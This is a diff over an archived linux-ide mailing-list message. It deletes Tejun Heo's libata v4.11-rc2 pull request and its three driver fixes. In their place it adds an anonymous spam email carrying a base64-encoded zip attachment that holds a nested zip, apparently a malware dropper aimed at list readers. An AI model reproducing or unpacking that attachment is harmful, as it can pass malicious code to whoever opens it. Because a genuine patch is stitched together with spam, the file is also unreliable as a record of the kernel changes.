@@ -1,153 +1,100 @@
-From: Tejun Heo <tj@kernel.org>
-Subject: [GIT PULL] libata changes for v4.11-rc2
-Date: Tue, 14 Mar 2017 16:57:49 -0400
-Message-ID: <20170314205749.GC15132@htj.duckdns.org>
+From: <beautyink@live.nl>
+Subject: (unknown)
+Date: Wed, 15 Mar 2017 03:58:48 -0000
+Message-ID: <148955032878.13099.13094199157984983107@codetel.net.do>
+Reply-To: <beautyink@live.nl>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="EMAIL_2088089_linux-ide.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mail-yw0-f195.google.com ([209.85.161.195]:34035 "EHLO
-        mail-yw0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752676AbdCNU5w (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Tue, 14 Mar 2017 16:57:52 -0400
-Content-Disposition: inline
+Received: from static.vnpt.vn ([14.177.134.68]:42074 "HELO codetel.net.do"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751015AbdCOD64 (ORCPT <rfc822;linux-ide@vger.kernel.org>);
+        Tue, 14 Mar 2017 23:58:56 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: Linus Torvalds <torvalds@linux-foundation.org>
-Cc: linux-kernel@vger.kernel.org, linux-ide@vger.kernel.org
+To: linux-ide <linux-ide@vger.kernel.org>
 
-Hello,
-
-Three libata fixes.
-
-* Fix for a circular reference bug in sysfs code which prevented
-  pata_legacy devices from being released after probe failure, which
-  in turn prevented devres from releasing the associated resources.
-
-* Drop spurious WARN in the command issue path which can be triggered
-  by a legitimate passthrough command.
-
-* A ahci_qoriq specific fix.
-
-Thanks.
-
-The following changes since commit c1ae3cfa0e89fa1a7ecc4c99031f5e9ae99d9201:
-
-  Linux 4.11-rc1 (2017-03-05 12:59:56 -0800)
-
-are available in the git repository at:
-
-  git://git.kernel.org/pub/scm/linux/kernel/git/tj/libata.git for-4.11-fixes
-
-for you to fetch changes up to 6022c5cadf1a43ca30f431f128daa6163909ad60:
-
-  ahci: qoriq: correct the sata ecc setting error (2017-03-09 11:55:23 -0500)
-
-----------------------------------------------------------------
-Gwendal Grignou (1):
-      libata: transport: Remove circular dependency at free time
-
-Tejun Heo (1):
-      libata: drop WARN from protocol error in ata_sff_qc_issue()
-
-Yuantian Tang (1):
-      ahci: qoriq: correct the sata ecc setting error
-
- drivers/ata/ahci_qoriq.c       | 6 ++++--
- drivers/ata/libata-sff.c       | 1 -
- drivers/ata/libata-transport.c | 9 +++------
- 3 files changed, 7 insertions(+), 9 deletions(-)
-
-diff --git a/drivers/ata/ahci_qoriq.c b/drivers/ata/ahci_qoriq.c
-index 85d8332..4c96f3a 100644
---- a/drivers/ata/ahci_qoriq.c
-+++ b/drivers/ata/ahci_qoriq.c
-@@ -177,7 +177,8 @@ static int ahci_qoriq_phy_init(struct ahci_host_priv *hpriv)
- 	case AHCI_LS1043A:
- 		if (!qpriv->ecc_addr)
- 			return -EINVAL;
--		writel(ECC_DIS_ARMV8_CH2, qpriv->ecc_addr);
-+		writel(readl(qpriv->ecc_addr) | ECC_DIS_ARMV8_CH2,
-+				qpriv->ecc_addr);
- 		writel(AHCI_PORT_PHY_1_CFG, reg_base + PORT_PHY1);
- 		writel(AHCI_PORT_TRANS_CFG, reg_base + PORT_TRANS);
- 		if (qpriv->is_dmacoherent)
-@@ -194,7 +195,8 @@ static int ahci_qoriq_phy_init(struct ahci_host_priv *hpriv)
- 	case AHCI_LS1046A:
- 		if (!qpriv->ecc_addr)
- 			return -EINVAL;
--		writel(ECC_DIS_ARMV8_CH2, qpriv->ecc_addr);
-+		writel(readl(qpriv->ecc_addr) | ECC_DIS_ARMV8_CH2,
-+				qpriv->ecc_addr);
- 		writel(AHCI_PORT_PHY_1_CFG, reg_base + PORT_PHY1);
- 		writel(AHCI_PORT_TRANS_CFG, reg_base + PORT_TRANS);
- 		if (qpriv->is_dmacoherent)
-diff --git a/drivers/ata/libata-sff.c b/drivers/ata/libata-sff.c
-index 2bd92dc..274d6d7 100644
---- a/drivers/ata/libata-sff.c
-+++ b/drivers/ata/libata-sff.c
-@@ -1482,7 +1482,6 @@ unsigned int ata_sff_qc_issue(struct ata_queued_cmd *qc)
- 		break;
- 
- 	default:
--		WARN_ON_ONCE(1);
- 		return AC_ERR_SYSTEM;
- 	}
- 
-diff --git a/drivers/ata/libata-transport.c b/drivers/ata/libata-transport.c
-index 4669823..19e6e53 100644
---- a/drivers/ata/libata-transport.c
-+++ b/drivers/ata/libata-transport.c
-@@ -224,7 +224,6 @@ static DECLARE_TRANSPORT_CLASS(ata_port_class,
- 
- static void ata_tport_release(struct device *dev)
- {
--	put_device(dev->parent);
- }
- 
- /**
-@@ -284,7 +283,7 @@ int ata_tport_add(struct device *parent,
- 	device_initialize(dev);
- 	dev->type = &ata_port_type;
- 
--	dev->parent = get_device(parent);
-+	dev->parent = parent;
- 	dev->release = ata_tport_release;
- 	dev_set_name(dev, "ata%d", ap->print_id);
- 	transport_setup_device(dev);
-@@ -348,7 +347,6 @@ static DECLARE_TRANSPORT_CLASS(ata_link_class,
- 
- static void ata_tlink_release(struct device *dev)
- {
--	put_device(dev->parent);
- }
- 
- /**
-@@ -410,7 +408,7 @@ int ata_tlink_add(struct ata_link *link)
- 	int error;
- 
- 	device_initialize(dev);
--	dev->parent = get_device(&ap->tdev);
-+	dev->parent = &ap->tdev;
- 	dev->release = ata_tlink_release;
- 	if (ata_is_host_link(link))
- 		dev_set_name(dev, "link%d", ap->print_id);
-@@ -589,7 +587,6 @@ static DECLARE_TRANSPORT_CLASS(ata_dev_class,
- 
- static void ata_tdev_release(struct device *dev)
- {
--	put_device(dev->parent);
- }
- 
- /**
-@@ -662,7 +659,7 @@ static int ata_tdev_add(struct ata_device *ata_dev)
- 	int error;
- 
- 	device_initialize(dev);
--	dev->parent = get_device(&link->tdev);
-+	dev->parent = &link->tdev;
- 	dev->release = ata_tdev_release;
- 	if (ata_is_host_link(link))
- 		dev_set_name(dev, "dev%d.%d", ap->print_id,ata_dev->devno);
-
--- 
-tejun
+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
+AAEAUgAAAHURAAAAAA==
